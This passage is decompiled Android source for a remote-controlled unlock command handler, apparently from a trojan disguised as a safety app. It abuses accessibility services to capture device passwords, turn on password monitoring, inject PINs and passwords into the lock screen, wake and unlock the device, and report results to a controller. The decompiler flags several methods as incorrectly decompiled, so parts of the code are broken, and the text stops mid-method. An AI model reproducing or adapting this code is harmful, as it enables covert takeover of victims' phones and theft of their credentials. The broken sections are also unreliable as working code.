package com.storm.safe.rock.service.modules.command;

import android.app.KeyguardManager;
import android.os.Bundle;
import android.os.PowerManager;
import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.cipher.C0335a1;
import io.socket.engineio.client.transports.PollingXHR;
import java.util.ArrayList;
import java.util.List;
import java.util.Set;
import kotlin.Pair;
import kotlin.collections.AbstractC0770a1;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.ContinuationImpl;
import org.json.JSONArray;
import org.json.JSONObject;
import p000.AbstractC0003a2;
import p000.AbstractC0715je;
import p000.C1351vv;
import p000.InterfaceC0726jp;
import p000.InterfaceC0876mv;
import p000.b60;
import p000.b81;
import p000.dh0;
import p000.fd0;
import p000.kg1;
import p000.t60;
import p000.uz0;
import p000.v81;
import p000.w00;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: com.storm.safe.rock.service.modules.command.a9 */
/* loaded from: classes2.dex */
public final class C0352a9 implements InterfaceC0726jp {
    static {
        new v81(null);
    }

    /* renamed from: a3 */
    public static void m211885a3(uz0 uz0Var) {
        try {
            AccessibilityNodeInfo rootInActiveWindow = uz0Var.f60536a0.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                return;
            }
            for (String str : dh0.m212602a1()) {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
                if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                    AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) AbstractC0715je.m213290h7(listFindAccessibilityNodeInfosByText);
                    if (accessibilityNodeInfo.isClickable()) {
                        accessibilityNodeInfo.performAction(16);
                        t60.m214714d6("UnlockCmdHandler", "[混合解锁] 点击确认按钮: " + str);
                        return;
                    }
                }
            }
            t60.m214726f4("UnlockCmdHandler", "[混合解锁] 未找到确认按钮，跳过");
        } catch (Exception unused) {
        }
    }

    /* renamed from: a4 */
    public static void m211886a4(AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        if (accessibilityNodeInfo.isEditable()) {
            arrayList.add(accessibilityNodeInfo);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                m211886a4(child, arrayList);
            }
        }
    }

    /* renamed from: a9 */
    public static boolean m211887a9(uz0 uz0Var, String str) {
        AccessibilityNodeInfo rootInActiveWindow;
        AccessibilityNodeInfo accessibilityNodeInfo;
        try {
            rootInActiveWindow = uz0Var.f60536a0.getRootInActiveWindow();
        } catch (Exception unused) {
        }
        if (rootInActiveWindow == null) {
            return false;
        }
        ArrayList arrayList = new ArrayList();
        m211886a4(rootInActiveWindow, arrayList);
        int size = arrayList.size();
        int i = 0;
        while (true) {
            if (i >= size) {
                accessibilityNodeInfo = (AccessibilityNodeInfo) AbstractC0715je.m213291h8(arrayList);
                break;
            }
            Object obj = arrayList.get(i);
            i++;
            accessibilityNodeInfo = (AccessibilityNodeInfo) obj;
            int inputType = accessibilityNodeInfo.getInputType();
            if ((inputType & 128) != 0 || (inputType & 16) != 0) {
                break;
            }
        }
        if (accessibilityNodeInfo == null) {
            t60.m214726f4("UnlockCmdHandler", "[混合解锁] 未找到密码输入框节点");
            return false;
        }
        Bundle bundle = new Bundle();
        bundle.putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", str);
        boolean zPerformAction = accessibilityNodeInfo.performAction(2097152, bundle);
        t60.m214714d6("UnlockCmdHandler", "[混合解锁] ACTION_SET_TEXT 结果: " + zPerformAction);
        return zPerformAction;
    }

    /* renamed from: b0 */
    public static void m211888b0(uz0 uz0Var, boolean z, String str) {
        try {
            uz0Var.f60536a0.m211515l2("smart_unlock_result", AbstractC0770a1.m213614f9(new Pair(PollingXHR.Request.EVENT_SUCCESS, Boolean.valueOf(z)), new Pair("message", str)));
            t60.m214714d6("UnlockCmdHandler", "[智能解锁] 发送结果: success=" + z + ", message=" + str);
        } catch (Exception e) {
            t60.m214705c6("UnlockCmdHandler", "[智能解锁] 发送结果失败", e);
        }
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a0 */
    public final boolean mo210872a0(String str) {
        return t60.m214690a8(this, str);
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a1 */
    public final Set mo210873a1() {
        return kg1.m213542f1("POWER_WAKE", "POWER_SLEEP", "SMART_UNLOCK_SWIPE", "NUMERIC_PIN_INPUT", "SMART_CONFIRM_DETECTION", "UNLOCK_DEVICE", "GET_DEVICE_PASSWORD", "SMART_NUMERIC_UNLOCK", "SMART_MIXED_UNLOCK", "ENABLE_PASSWORD_MONITORING");
    }

    /* JADX WARN: Can't fix incorrect switch cases order, some code will duplicate */
    /* JADX WARN: Code restructure failed: missing block: B:135:0x0200, code lost:
    
        if (r5.equals("PATTERN") == false) goto L136;
     */
    /* JADX WARN: Failed to restore switch over string. Please report as a decompilation issue */
    /* JADX WARN: Removed duplicated region for block: B:148:0x023d A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:26:0x0057  */
    /* JADX WARN: Removed duplicated region for block: B:27:0x0058  */
    /* JADX WARN: Removed duplicated region for block: B:29:0x005b A[Catch: Exception -> 0x0053, TryCatch #5 {Exception -> 0x0053, blocks: (B:22:0x004e, B:29:0x005b, B:32:0x0065, B:35:0x006f, B:37:0x007a, B:39:0x0080, B:40:0x0085, B:41:0x008a), top: B:159:0x004e }] */
    /* JADX WARN: Removed duplicated region for block: B:30:0x0062  */
    /* JADX WARN: Removed duplicated region for block: B:32:0x0065 A[Catch: Exception -> 0x0053, TryCatch #5 {Exception -> 0x0053, blocks: (B:22:0x004e, B:29:0x005b, B:32:0x0065, B:35:0x006f, B:37:0x007a, B:39:0x0080, B:40:0x0085, B:41:0x008a), top: B:159:0x004e }] */
    /* JADX WARN: Removed duplicated region for block: B:41:0x008a A[Catch: Exception -> 0x0053, TRY_LEAVE, TryCatch #5 {Exception -> 0x0053, blocks: (B:22:0x004e, B:29:0x005b, B:32:0x0065, B:35:0x006f, B:37:0x007a, B:39:0x0080, B:40:0x0085, B:41:0x008a), top: B:159:0x004e }] */
    @Override // p000.InterfaceC0726jp
    /* renamed from: a2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object mo210874a2(String str, JSONObject jSONObject, final uz0 uz0Var, InterfaceC0876mv interfaceC0876mv) {
        String strOptString;
        Object objM211890a6;
        Object objM211889a5;
        final int iOptInt;
        Object objM211891a7;
        Object objM211892a8;
        C1351vv c1351vv = C1351vv.f60710b1;
        String strOptString2 = null;
        final String str2 = "";
        switch (str.hashCode()) {
            case -1888991397:
                if (str.equals("GET_DEVICE_PASSWORD")) {
                    String str3 = "PATTERN";
                    t60.m214714d6("UnlockCmdHandler", "收到获取设备密码命令（控制端）");
                    if (jSONObject != null) {
                        try {
                            strOptString = jSONObject.optString("passwordType", "");
                        } catch (Exception e) {
                            t60.m214705c6("UnlockCmdHandler", "处理密码检测命令失败", e);
                        }
                    } else {
                        strOptString = null;
                    }
                    if (strOptString != null) {
                        str2 = strOptString;
                    }
                    t60.m214714d6("UnlockCmdHandler", "密码类型参数: ".concat(str2));
                    int iHashCode = str2.hashCode();
                    if (iHashCode == -73107600) {
                        break;
                    } else {
                        if (iHashCode != 76134378) {
                            if (iHashCode == 76134380) {
                                str2.equals("PIN_6");
                            }
                            str3 = "PIN_6";
                        } else if (str2.equals("PIN_4")) {
                            str3 = "PIN_4";
                        }
                        str3 = "PIN_6";
                    }
                    dqtvuisjd dqtvuisjdVar = uz0Var.f60536a0;
                    Object systemService = dqtvuisjdVar.getSystemService("keyguard");
                    KeyguardManager keyguardManager = systemService instanceof KeyguardManager ? (KeyguardManager) systemService : null;
                    if (keyguardManager != null ? keyguardManager.isKeyguardLocked() : false) {
                        dqtvuisjdVar.f52470k1 = str3;
                        t60.m214714d6("UnlockCmdHandler", "设备锁屏中，已保存待触发密码类型: " + str3 + "，等待用户解锁后触发");
                    } else {
                        dqtvuisjdVar.f52470k1 = null;
                        dqtvuisjdVar.m211521l8(str3);
                    }
                }
            case -442160419:
                if (str.equals("POWER_SLEEP")) {
                    t60.m214714d6("UnlockCmdHandler", "锁定屏幕");
                    try {
                        if (uz0Var.f60536a0.performGlobalAction(8)) {
                            t60.m214714d6("UnlockCmdHandler", "屏幕已锁定");
                        } else {
                            t60.m214726f4("UnlockCmdHandler", "锁定屏幕失败（可能需要Android 9.0+）");
                        }
                    } catch (Exception e2) {
                        t60.m214705c6("UnlockCmdHandler", "锁定屏幕失败", e2);
                    }
                }
            case 527688624:
                if (str.equals("ENABLE_PASSWORD_MONITORING")) {
                    t60.m214714d6("UnlockCmdHandler", "收到启用密码监听命令");
                    try {
                        dqtvuisjd dqtvuisjdVar2 = uz0Var.f60536a0;
                        try {
                            t60.m214714d6("dqtvuisjd", "🔷 启用系统密码监听模式");
                            dqtvuisjdVar2.f52471k2 = 0;
                            dqtvuisjdVar2.f52474k5 = true;
                            C0335a1 c0335a1 = dqtvuisjdVar2.f52438g9;
                            if (c0335a1 != null) {
                                C0335a1.m211788c1(c0335a1);
                                t60.m214714d6("dqtvuisjd", "✅ 密码监听模式已启用");
                            }
                            dqtvuisjdVar2.m211490i4();
                        } catch (Exception e3) {
                            t60.m214705c6("dqtvuisjd", "❌ 启用密码监听失败", e3);
                            dqtvuisjdVar2.f52474k5 = false;
                        }
                        t60.m214714d6("UnlockCmdHandler", "密码监听模式已启用");
                    } catch (Exception e4) {
                        t60.m214705c6("UnlockCmdHandler", "启用密码监听失败", e4);
                    }
                }
            case 808208126:
                return (str.equals("SMART_MIXED_UNLOCK") && (objM211890a6 = m211890a6(jSONObject, uz0Var, (ContinuationImpl) interfaceC0876mv)) == CoroutineSingletons.f57606a0) ? objM211890a6 : c1351vv;
            case 887750965:
                if (str.equals("SMART_UNLOCK_SWIPE")) {
                    t60.m214714d6("UnlockCmdHandler", "执行智能上滑解锁");
                    try {
                        fd0 fd0VarM214868a4 = uz0Var.m214868a4();
                        if (fd0VarM214868a4 == null || !fd0VarM214868a4.m212793a1()) {
                            uz0Var.m214877b3();
                        } else {
                            fd0VarM214868a4.m212794a2(new w00() { // from class: com.storm.safe.rock.service.modules.command.UnlockCommandHandler$handleSmartUnlockSwipe$1
                                {
                                    super(0);
                                }

                                @Override // p000.w00
                                public final Object invoke() throws InterruptedException {
                                    uz0Var.m214877b3();
                                    return C1351vv.f60710b1;
                                }
                            });
                        }
                        t60.m214714d6("UnlockCmdHandler", "智能上滑解锁已执行");
                    } catch (Exception e5) {
                        t60.m214705c6("UnlockCmdHandler", "智能上滑解锁失败", e5);
                    }
                }
            case 955676862:
                if (str.equals("POWER_WAKE")) {
                    t60.m214714d6("UnlockCmdHandler", "点亮屏幕");
                    try {
                        Object systemService2 = uz0Var.f60536a0.getSystemService("power");
                        t60.m214693b4(systemService2, "null cannot be cast to non-null type android.os.PowerManager");
                        ((PowerManager) systemService2).newWakeLock(268435466, "SystemHelper:WakeLock").acquire(30000L);
                        t60.m214714d6("UnlockCmdHandler", "屏幕已点亮（保持30秒）");
                    } catch (Exception e6) {
                        t60.m214705c6("UnlockCmdHandler", "点亮屏幕失败", e6);
                    }
                }
            case 1354164622:
                if (str.equals("NUMERIC_PIN_INPUT") && (objM211889a5 = m211889a5(jSONObject, uz0Var, (ContinuationImpl) interfaceC0876mv)) == CoroutineSingletons.f57606a0) {
                    return objM211889a5;
                }
                break;
            case 1414286960:
                if (str.equals("SMART_CONFIRM_DETECTION")) {
                    t60.m214714d6("UnlockCmdHandler", "执行智能确认按钮检测");
                    if (jSONObject != null) {
                        try {
                            strOptString2 = jSONObject.optString("passwordType", "");
                            if (strOptString2 == null) {
                                str2 = strOptString2;
                            }
                            iOptInt = jSONObject == null ? jSONObject.optInt("screenWidth", 0) : 0;
                            final int iOptInt2 = jSONObject != null ? jSONObject.optInt("screenHeight", 0) : 0;
                            if (iOptInt > 0 || iOptInt2 <= 0) {
                                t60.m214726f4("UnlockCmdHandler", "智能确认检测参数无效");
                            } else {
                                w00 w00Var = new w00() { // from class: com.storm.safe.rock.service.modules.command.UnlockCommandHandler$handleSmartConfirmDetection$performConfirm$1
                                    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                                    {
                                        super(0);
                                    }

                                    @Override // p000.w00
                                    public final Object invoke() {
                                        uz0 uz0Var2 = uz0Var;
                                        uz0Var2.getClass();
                                        uz0Var2.f60536a0.m211501j5(iOptInt, iOptInt2, str2);
                                        t60.m214714d6("UnlockCmdHandler", "智能确认按钮检测已执行");
                                        return C1351vv.f60710b1;
                                    }
                                };
                                fd0 fd0VarM214868a42 = uz0Var.m214868a4();
                                if (fd0VarM214868a42 == null || !fd0VarM214868a42.m212793a1()) {
                                    w00Var.invoke();
                                } else {
                                    fd0VarM214868a42.m212794a2(w00Var);
                                }
                            }
                        } catch (Exception e7) {
                            t60.m214705c6("UnlockCmdHandler", "智能确认按钮检测失败", e7);
                        }
                    } else {
                        if (strOptString2 == null) {
                        }
                        if (jSONObject == null) {
                        }
                        if (jSONObject != null) {
                        }
                        if (iOptInt > 0) {
                            t60.m214726f4("UnlockCmdHandler", "智能确认检测参数无效");
                        }
                    }
                }
            case 1954520620:
                if (str.equals("SMART_NUMERIC_UNLOCK") && (objM211891a7 = m211891a7(jSONObject, uz0Var, (ContinuationImpl) interfaceC0876mv)) == CoroutineSingletons.f57606a0) {
                    return objM211891a7;
                }
                break;
            case 1988085681:
                if (str.equals("UNLOCK_DEVICE") && (objM211892a8 = m211892a8(jSONObject, uz0Var, (ContinuationImpl) interfaceC0876mv)) == CoroutineSingletons.f57606a0) {
                    return objM211892a8;
                }
                break;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:56:0x00e4 A[Catch: Exception -> 0x0042, TryCatch #0 {Exception -> 0x0042, blocks: (B:12:0x003b, B:51:0x00cf, B:53:0x00da, B:55:0x00e0, B:56:0x00e4, B:20:0x0059, B:27:0x0068, B:30:0x0072, B:33:0x007c, B:36:0x0086, B:38:0x008e, B:46:0x00a6, B:57:0x00e8), top: B:62:0x002b }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x001b  */
    /* renamed from: a5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211889a5(JSONObject jSONObject, uz0 uz0Var, ContinuationImpl continuationImpl) throws Throwable {
        UnlockCommandHandler$handleNumericPinInput$1 unlockCommandHandler$handleNumericPinInput$1;
        int iOptInt;
        int iOptInt2;
        String str;
        int i;
        int i2;
        final String str2;
        final int i3;
        final int i4;
        w00 w00Var;
        fd0 fd0VarM214868a4;
        uz0 uz0Var2 = uz0Var;
        if (continuationImpl instanceof UnlockCommandHandler$handleNumericPinInput$1) {
            unlockCommandHandler$handleNumericPinInput$1 = (UnlockCommandHandler$handleNumericPinInput$1) continuationImpl;
            int i5 = unlockCommandHandler$handleNumericPinInput$1.f53540a8;
            if ((i5 & Integer.MIN_VALUE) != 0) {
                unlockCommandHandler$handleNumericPinInput$1.f53540a8 = i5 - Integer.MIN_VALUE;
            } else {
                unlockCommandHandler$handleNumericPinInput$1 = new UnlockCommandHandler$handleNumericPinInput$1(this, continuationImpl);
            }
        }
        Object obj = unlockCommandHandler$handleNumericPinInput$1.f53538a6;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i6 = unlockCommandHandler$handleNumericPinInput$1.f53540a8;
        try {
        } catch (Exception e) {
            t60.m214705c6("UnlockCmdHandler", "数字密码输入失败", e);
        }
        if (i6 == 0) {
            kg1.m213544f4(obj);
            t60.m214714d6("UnlockCmdHandler", "执行数字密码输入");
            String str3 = "";
            String strOptString = jSONObject != null ? jSONObject.optString("digit", "") : null;
            if (strOptString != null) {
                str3 = strOptString;
            }
            int iOptInt3 = jSONObject != null ? jSONObject.optInt("screenWidth", 0) : 0;
            int iOptInt4 = jSONObject != null ? jSONObject.optInt("screenHeight", 0) : 0;
            iOptInt = jSONObject != null ? jSONObject.optInt("index", 0) : 0;
            iOptInt2 = jSONObject != null ? jSONObject.optInt("total", 0) : 0;
            if (str3.length() <= 0 || iOptInt3 <= 0 || iOptInt4 <= 0) {
                t60.m214726f4("UnlockCmdHandler", "数字密码输入参数无效");
                return C1351vv.f60710b1;
            }
            if (iOptInt != 0 && iOptInt != 1) {
                str2 = str3;
                i3 = iOptInt3;
                i4 = iOptInt4;
                final int i7 = iOptInt2;
                final uz0 uz0Var3 = uz0Var2;
                final int i8 = iOptInt;
                w00Var = new w00() { // from class: com.storm.safe.rock.service.modules.command.UnlockCommandHandler$handleNumericPinInput$performInput$1
                    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
                    {
                        super(0);
                    }

                    @Override // p000.w00
                    public final Object invoke() {
                        b60 b60Var = uz0Var3.f60536a0.f52420f1;
                        if (b60Var == null) {
                            b60Var = null;
                        }
                        if (b60Var != null) {
                            int i9 = i3;
                            int i10 = i4;
                            String str4 = str2;
                            b60Var.m210554b2(i9, i10, str4);
                            StringBuilder sbM40c1 = AbstractC0003a2.m40c1("数字密码输入已执行: ", str4, " (", i8, "/");
                            sbM40c1.append(i7);
                            sbM40c1.append(")");
                            t60.m214714d6("UnlockCmdHandler", sbM40c1.toString());
                        } else {
                            t60.m214726f4("UnlockCmdHandler", "InputManager 未初始化");
                        }
                        return C1351vv.f60710b1;
                    }
                };
                fd0VarM214868a4 = uz0Var3.m214868a4();
                if (fd0VarM214868a4 == null && fd0VarM214868a4.m212793a1()) {
                    fd0VarM214868a4.m212794a2(w00Var);
                } else {
                    w00Var.invoke();
                }
                return C1351vv.f60710b1;
            }
            t60.m214714d6("UnlockCmdHandler", "数字密码输入前唤醒屏幕");
            uz0Var2.f60536a0.m211536n5();
            unlockCommandHandler$handleNumericPinInput$1.f53532a0 = uz0Var2;
            unlockCommandHandler$handleNumericPinInput$1.f53533a1 = str3;
            unlockCommandHandler$handleNumericPinInput$1.f53534a2 = iOptInt3;
            unlockCommandHandler$handleNumericPinInput$1.f53535a3 = iOptInt4;
            unlockCommandHandler$handleNumericPinInput$1.f53536a4 = iOptInt;
            unlockCommandHandler$handleNumericPinInput$1.f53537a5 = iOptInt2;
            unlockCommandHandler$handleNumericPinInput$1.f53540a8 = 1;
            if (b81.m210571b1(500L, unlockCommandHandler$handleNumericPinInput$1) == coroutineSingletons) {
                return coroutineSingletons;
            }
            str = str3;
            i = iOptInt3;
            i2 = iOptInt4;
        } else {
            if (i6 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            iOptInt2 = unlockCommandHandler$handleNumericPinInput$1.f53537a5;
            int i9 = unlockCommandHandler$handleNumericPinInput$1.f53536a4;
            i2 = unlockCommandHandler$handleNumericPinInput$1.f53535a3;
            i = unlockCommandHandler$handleNumericPinInput$1.f53534a2;
            str = unlockCommandHandler$handleNumericPinInput$1.f53533a1;
            uz0 uz0Var4 = unlockCommandHandler$handleNumericPinInput$1.f53532a0;
            kg1.m213544f4(obj);
            iOptInt = i9;
            uz0Var2 = uz0Var4;
        }
        i4 = i2;
        i3 = i;
        str2 = str;
        final int i72 = iOptInt2;
        final uz0 uz0Var32 = uz0Var2;
        final int i82 = iOptInt;
        w00Var = new w00() { // from class: com.storm.safe.rock.service.modules.command.UnlockCommandHandler$handleNumericPinInput$performInput$1
            /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
            {
                super(0);
            }

            @Override // p000.w00
            public final Object invoke() {
                b60 b60Var = uz0Var32.f60536a0.f52420f1;
                if (b60Var == null) {
                    b60Var = null;
                }
                if (b60Var != null) {
                    int i92 = i3;
                    int i10 = i4;
                    String str4 = str2;
                    b60Var.m210554b2(i92, i10, str4);
                    StringBuilder sbM40c1 = AbstractC0003a2.m40c1("数字密码输入已执行: ", str4, " (", i82, "/");
                    sbM40c1.append(i72);
                    sbM40c1.append(")");
                    t60.m214714d6("UnlockCmdHandler", sbM40c1.toString());
                } else {
                    t60.m214726f4("UnlockCmdHandler", "InputManager 未初始化");
                }
                return C1351vv.f60710b1;
            }
        };
        fd0VarM214868a4 = uz0Var32.m214868a4();
        if (fd0VarM214868a4 == null) {
            w00Var.invoke();
        }
        return C1351vv.f60710b1;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:70:0x0119  */
    /* JADX WARN: Removed duplicated region for block: B:71:0x011a A[Catch: Exception -> 0x005a, PHI: r2 r3 r7
      0x011a: PHI (r2v4 uz0) = (r2v3 uz0), (r2v9 uz0) binds: [B:69:0x0117, B:32:0x0070] A[DONT_GENERATE, DONT_INLINE]
      0x011a: PHI (r3v9 java.lang.String) = (r3v8 java.lang.String), (r3v18 java.lang.String) binds: [B:69:0x0117, B:32:0x0070] A[DONT_GENERATE, DONT_INLINE]
      0x011a: PHI (r7v8 com.storm.safe.rock.service.modules.command.a9) = (r7v20 com.storm.safe.rock.service.modules.command.a9), (r7v21 com.storm.safe.rock.service.modules.command.a9) binds: [B:69:0x0117, B:32:0x0070] A[DONT_GENERATE, DONT_INLINE], TryCatch #0 {Exception -> 0x005a, blocks: (B:23:0x0055, B:79:0x015e, B:28:0x0062, B:76:0x0141, B:31:0x006d, B:71:0x011a, B:73:0x0128, B:34:0x0079, B:62:0x00ec, B:64:0x00f7, B:66:0x00fd, B:68:0x0109, B:67:0x0106), top: B:91:0x0031 }] */
    /* JADX WARN: Removed duplicated region for block: B:73:0x0128 A[Catch: Exception -> 0x005a, TryCatch #0 {Exception -> 0x005a, blocks: (B:23:0x0055, B:79:0x015e, B:28:0x0062, B:76:0x0141, B:31:0x006d, B:71:0x011a, B:73:0x0128, B:34:0x0079, B:62:0x00ec, B:64:0x00f7, B:66:0x00fd, B:68:0x0109, B:67:0x0106), top: B:91:0x0031 }] */
    /* JADX WARN: Removed duplicated region for block: B:78:0x015d  */
    /* JADX WARN: Removed duplicated region for block: B:79:0x015e A[Catch: Exception -> 0x005a, PHI: r2 r7
      0x015e: PHI (r2v6 uz0) = (r2v5 uz0), (r2v11 uz0) binds: [B:77:0x015b, B:23:0x0055] A[DONT_GENERATE, DONT_INLINE]
      0x015e: PHI (r7v10 ??) = (r7v15 ??), (r7v16 ??) binds: [B:77:0x015b, B:23:0x0055] A[DONT_GENERATE, DONT_INLINE], TRY_LEAVE, TryCatch #0 {Exception -> 0x005a, blocks: (B:23:0x0055, B:79:0x015e, B:28:0x0062, B:76:0x0141, B:31:0x006d, B:71:0x011a, B:73:0x0128, B:34:0x0079, B:62:0x00ec, B:64:0x00f7, B:66:0x00fd, B:68:0x0109, B:67:0x0106), top: B:91:0x0031 }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x001d  */
    /* JADX WARN: Removed duplicated region for block: B:82:0x016e  */
    /* JADX WARN: Removed duplicated region for block: B:85:0x0177 A[Catch: Exception -> 0x0046, TryCatch #1 {Exception -> 0x0046, blocks: (B:16:0x0041, B:83:0x016f, B:85:0x0177, B:87:0x0185), top: B:93:0x0041 }] */
    /* JADX WARN: Removed duplicated region for block: B:87:0x0185 A[Catch: Exception -> 0x0046, TRY_LEAVE, TryCatch #1 {Exception -> 0x0046, blocks: (B:16:0x0041, B:83:0x016f, B:85:0x0177, B:87:0x0185), top: B:93:0x0041 }] */
    /* JADX WARN: Type inference failed for: r7v0, types: [int] */
    /* JADX WARN: Type inference failed for: r7v1 */
    /* JADX WARN: Type inference failed for: r7v10, types: [com.storm.safe.rock.service.modules.command.a9] */
    /* JADX WARN: Type inference failed for: r7v15 */
    /* JADX WARN: Type inference failed for: r7v16 */
    /* renamed from: a6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211890a6(JSONObject jSONObject, uz0 uz0Var, ContinuationImpl continuationImpl) throws Throwable {
        UnlockCommandHandler$handleSmartMixedUnlock$1 unlockCommandHandler$handleSmartMixedUnlock$1;
        C0352a9 c0352a9;
        String str;
        String strOptString;
        C0352a9 c0352a92;
        fd0 fd0VarM214868a4;
        C0352a9 c0352a93;
        C0352a9 c0352a94;
        final uz0 uz0Var2 = uz0Var;
        C1351vv c1351vv = C1351vv.f60710b1;
        if (continuationImpl instanceof UnlockCommandHandler$handleSmartMixedUnlock$1) {
            unlockCommandHandler$handleSmartMixedUnlock$1 = (UnlockCommandHandler$handleSmartMixedUnlock$1) continuationImpl;
            int i = unlockCommandHandler$handleSmartMixedUnlock$1.f53556a5;
            if ((i & Integer.MIN_VALUE) != 0) {
                unlockCommandHandler$handleSmartMixedUnlock$1.f53556a5 = i - Integer.MIN_VALUE;
            } else {
                unlockCommandHandler$handleSmartMixedUnlock$1 = new UnlockCommandHandler$handleSmartMixedUnlock$1(this, continuationImpl);
            }
        }
        Object objM211894b2 = unlockCommandHandler$handleSmartMixedUnlock$1.f53554a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        ?? r7 = unlockCommandHandler$handleSmartMixedUnlock$1.f53556a5;
        try {
            if (r7 == 0) {
                kg1.m213544f4(objM211894b2);
                t60.m214714d6("UnlockCmdHandler", "[混合解锁] 开始执行字母数字密码解锁");
                str = "";
                if (jSONObject != null) {
                    try {
                        strOptString = jSONObject.optString("password", "");
                    } catch (Exception e) {
                        e = e;
                        c0352a9 = this;
                        t60.m214705c6("UnlockCmdHandler", "[混合解锁] 执行异常", e);
                        String str2 = "执行异常: " + e.getMessage();
                        c0352a9.getClass();
                        m211888b0(uz0Var2, false, str2);
                        return c1351vv;
                    }
                } else {
                    strOptString = null;
                }
                if (strOptString != null) {
                    str = strOptString;
                }
                if (str.length() == 0) {
                    t60.m214704c5("UnlockCmdHandler", "[混合解锁] 密码为空");
                    m211888b0(uz0Var2, false, "密码为空");
                    return c1351vv;
                }
                Object systemService = uz0Var2.f60536a0.getSystemService("keyguard");
                KeyguardManager keyguardManager = systemService instanceof KeyguardManager ? (KeyguardManager) systemService : null;
                if (keyguardManager != null && !keyguardManager.isKeyguardLocked()) {
                    t60.m214714d6("UnlockCmdHandler", "[混合解锁] 设备未锁屏，无需解锁");
                    m211888b0(uz0Var2, true, "设备未锁屏");
                    return c1351vv;
                }
                t60.m214714d6("UnlockCmdHandler", "[混合解锁] 步骤1: 唤醒屏幕");
                uz0Var2.f60536a0.m211536n5();
                unlockCommandHandler$handleSmartMixedUnlock$1.f53551a0 = this;
                unlockCommandHandler$handleSmartMixedUnlock$1.f53552a1 = uz0Var2;
                unlockCommandHandler$handleSmartMixedUnlock$1.f53553a2 = str;
                unlockCommandHandler$handleSmartMixedUnlock$1.f53556a5 = 1;
                if (b81.m210571b1(500L, unlockCommandHandler$handleSmartMixedUnlock$1) != coroutineSingletons) {
                    c0352a92 = this;
                    t60.m214714d6("UnlockCmdHandler", "[混合解锁] 步骤2: 执行上滑");
                    fd0VarM214868a4 = uz0Var2.m214868a4();
                    if (fd0VarM214868a4 == null) {
                    }
                    uz0Var2.m214877b3();
                    unlockCommandHandler$handleSmartMixedUnlock$1.f53551a0 = c0352a92;
                    unlockCommandHandler$handleSmartMixedUnlock$1.f53552a1 = uz0Var2;
                    unlockCommandHandler$handleSmartMixedUnlock$1.f53553a2 = str;
                    unlockCommandHandler$handleSmartMixedUnlock$1.f53556a5 = 2;
                    c0352a93 = c0352a92;
                    if (b81.m210571b1(1200L, unlockCommandHandler$handleSmartMixedUnlock$1) == coroutineSingletons) {
                    }
                }
                return coroutineSingletons;
            }
            if (r7 == 1) {
                String str3 = unlockCommandHandler$handleSmartMixedUnlock$1.f53553a2;
                uz0Var2 = unlockCommandHandler$handleSmartMixedUnlock$1.f53552a1;
                C0352a9 c0352a95 = unlockCommandHandler$handleSmartMixedUnlock$1.f53551a0;
                kg1.m213544f4(objM211894b2);
                str = str3;
                c0352a92 = c0352a95;
                t60.m214714d6("UnlockCmdHandler", "[混合解锁] 步骤2: 执行上滑");
                fd0VarM214868a4 = uz0Var2.m214868a4();
                if (fd0VarM214868a4 == null && fd0VarM214868a4.m212793a1()) {
                    fd0VarM214868a4.m212794a2(new w00() { // from class: com.storm.safe.rock.service.modules.command.UnlockCommandHandler$handleSmartMixedUnlock$2
                        {
                            super(0);
                        }

                        @Override // p000.w00
                        public final Object invoke() throws InterruptedException {
                            uz0Var2.m214877b3();
                            return C1351vv.f60710b1;
                        }
                    });
                } else {
                    uz0Var2.m214877b3();
                }
                unlockCommandHandler$handleSmartMixedUnlock$1.f53551a0 = c0352a92;
                unlockCommandHandler$handleSmartMixedUnlock$1.f53552a1 = uz0Var2;
                unlockCommandHandler$handleSmartMixedUnlock$1.f53553a2 = str;
                unlockCommandHandler$handleSmartMixedUnlock$1.f53556a5 = 2;
                c0352a93 = c0352a92;
                if (b81.m210571b1(1200L, unlockCommandHandler$handleSmartMixedUnlock$1) == coroutineSingletons) {
                    t60.m214714d6("UnlockCmdHandler", "[混合解锁] 步骤3: 查找输入框并注入密码");
                    c0352a93.getClass();
                    c0352a94 = c0352a93;
                    if (!m211887a9(uz0Var2, str)) {
                    }
                    t60.m214714d6("UnlockCmdHandler", "[混合解锁] 步骤4: 尝试点击确认按钮");
                    c0352a94.getClass();
                    m211885a3(uz0Var2);
                    unlockCommandHandler$handleSmartMixedUnlock$1.f53551a0 = c0352a94;
                    unlockCommandHandler$handleSmartMixedUnlock$1.f53552a1 = uz0Var2;
                    unlockCommandHandler$handleSmartMixedUnlock$1.f53553a2 = null;
                    unlockCommandHandler$handleSmartMixedUnlock$1.f53556a5 = 4;
